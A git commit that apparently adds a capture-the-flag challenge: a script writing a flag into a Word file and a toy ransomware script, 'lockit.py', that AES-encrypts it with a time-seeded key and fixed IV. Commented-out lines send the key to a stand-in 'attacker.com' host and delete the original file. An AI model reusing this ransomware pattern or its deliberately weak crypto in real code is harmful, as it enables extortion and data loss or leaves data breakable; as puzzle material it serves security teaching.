cbb61b3835b680a966caf6c350a297c08ce7366d
Harshvardhan Sharma <harsh1618@outlook.com>
2016-03-29 03:27:24 +0530

    Added challenge 2

---
+++ home/2/gen_docx.py
@@ -0,0 +1,14 @@
+#!/usr/bin/python
+from docx import Document
+import sys
+from subprocess import check_output
+
+if len(sys.argv) != 2:
+    print "Usage: %s username" % sys.argv[0]
+    exit(1)
+
+flag = check_output(["../../gen_flag.py", "lockit", sys.argv[1]])
+document = Document()
+
+p = document.add_paragraph(flag)
+document.save('secret.docx')
---
+++ home/2/lockit.py
@@ -0,0 +1,56 @@
+#!/usr/bin/python
+
+'''
+  _    _     ___   ____ _  _____ _____    _  
+ | |  | |   / _ \ / ___| |/ /_ _|_   _|  | | 
+/ __) | |  | | | | |   | ' / | |  | |   / __)
+\__ \ | |__| |_| | |___| . \ | |  | |   \__ \
+(   / |_____\___/ \____|_|\_\___| |_|   (   /
+ |_|                                     |_| 
+
+'''
+
+from Crypto.Cipher import AES
+import random
+import time
+import os
+
+plaintext_file = "secret.docx"
+encrypted_file = "secret.docx.enc"
+IV = "\x42" * AES.block_size
+
+#def send_key(key):
+#    '''
+#    Send the encryption key to our server.
+#    '''
+#    import requests
+#    requests.get("https://attacker.com", params = {"file" : plaintext_file, "key" : key})
+
+def generate_key(size):
+    key = bytearray()
+    random.seed(int(time.time()))
+    for _ in range(size):
+        key.append(random.randint(0, 255))
+    return str(key)
+
+def pad(text):
+    return text + (AES.block_size - len(text) % AES.block_size) * "\xff"
+
+def encrypt(plaintext, cipher):
+    return cipher.encrypt(pad(plaintext)).encode('hex')
+
+def main():
+    with open(plaintext_file, 'r') as f:
+        plaintext = f.read()
+    key = generate_key(32)
+    # send_key(key.encode('hex'))
+    cipher = AES.new(key, IV=IV, mode=AES.MODE_CBC)
+    ciphertext = encrypt(plaintext, cipher)
+    with open(encrypted_file, 'w') as f:
+        f.write(ciphertext)
+    # 😈
+    # os.remove(plaintext_file)
+
+if __name__ == "__main__":
+    main()
+
